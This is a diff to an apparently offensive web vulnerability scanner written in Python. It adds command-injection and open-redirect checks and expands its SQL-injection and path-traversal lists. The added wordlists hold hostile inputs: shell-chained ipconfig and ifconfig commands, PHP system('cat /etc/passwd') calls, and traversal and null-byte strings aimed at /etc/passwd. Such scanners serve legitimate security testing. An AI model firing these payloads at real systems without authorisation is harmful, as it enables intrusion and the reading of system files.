@@ -8,10 +8,12 @@ import sys
 import os
 import requests
 from urllib.request import urlopen
-from parametizer.params import parametizer
+from parametizer.params import parametizer, parametizer2
 from parametizer.core.save_it import save_output 
 from scanners.scan_xss import xss, xss_params
 from scanners.scan_idor import idor
+from scanners.scan_rce import rce, rce_params
+from scanners.scan_redirect import redirect, redirect_params
 from scanners.scan_lfi  import lfi, lfi_params
 from scanners.scan_sqli import sqli, sqli_params
 from scanners.scan_ssrf import ssrf, ssrf_params
@@ -39,7 +41,7 @@ br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.
 ('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('Accept-Encoding','br')]
 
 
-def scan(U,c,cl,h,x,l,s,i,sr,sst,output,fname,o,vulnerables_urls,op,params):
+def scan(U,c,cl,h,x,l,s,i,r,rc,sr,sst,output,fname,o,vulnerables_urls,op,params):
     if 'http://' in U:
         pass
     elif 'https://' in U:
@@ -133,12 +135,57 @@ def scan(U,c,cl,h,x,l,s,i,sr,sst,output,fname,o,vulnerables_urls,op,params):
         print()        
         print('\033[1;33mSearch idor parameters:\033[0m')
         print()
-        idor(uri,wordlist,vulnerables_urls,params)  
-              
-    #others payloads "%28","%29","%26","%21","'-'","'^'","'*'","'&'"
+        idor(uri,wordlist,vulnerables_urls,params)
+
+    if rc:
+        uri=[]
+        wordlist=['| ipconfig /all','; ipconfig /all','& ipconfig /all','| ifconfig',
+             '& ifconfig', '; ifeconfig','&& ifconfig','system("cat /etc/passwd");','system("cat /etc/passwd");']
+        parametizer(U,output)
+        try:
+         with open(output, "r") as f:
+                for q in f.readlines():
+                    q = q.strip()
+                    if q == "" or q.startswith("#"):
+                        continue
+                    uri.append(q)            
+        except:
+             pass
+        if op:
+         rce_params(uri,params)
+        else:     
+         print()        
+         print('\033[1;33mTest rce for default payload:\033[0m')
+         print()        
+         rce(uri,wordlist,vulnerables_urls)
+
+
+    if r:
+        uri=[]
+        wordlist=['////example.com/','////example.com/','https:///example.com/','/<>//example.com',
+        '/?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com'
+        ,'/\/\/example.com/','/https:example.com']
+        parametizer(U,output)
+        try:
+         with open(output, "r") as f:
+                for q in f.readlines():
+                    q = q.strip()
+                    if q == "" or q.startswith("#"):
+                        continue
+                    uri.append(q)            
+        except:
+             pass
+        if op:
+         redirect_params(uri,params)
+        else:     
+         print()        
+         print('\033[1;33mTest redirect for default payload:\033[0m')
+         print()        
+         redirect(uri,wordlist,vulnerables_urls)         
+
     if s:
         uri=[]
-        wordlist=["'"]
+        wordlist=["'","%28","%29","%26","%21","'-'","'^'","'*'","'&'"]
         parametizer(U,output) 
         try:
          with open(output, "r") as f:
@@ -180,7 +227,8 @@ def scan(U,c,cl,h,x,l,s,i,sr,sst,output,fname,o,vulnerables_urls,op,params):
 
     if l:
         uri=[]
-        wordlist=['../../../../../../../../../../../../../../../../../../../../../../etc/passwd']
+        wordlist=['../../../../../../../../../../../../../../../../../../../../../../etc/passwd','\..\..\..\..\..\..\..\..\..\..\etc\passwd',
+        '\..\..\..\..\..\..\..\..\..\..\etc\passwd%00','%00/etc/passwd%00','%00../../../../../../etc/passwd']
         parametizer(U,output)
         try: 
          with open(output, "r") as f:    
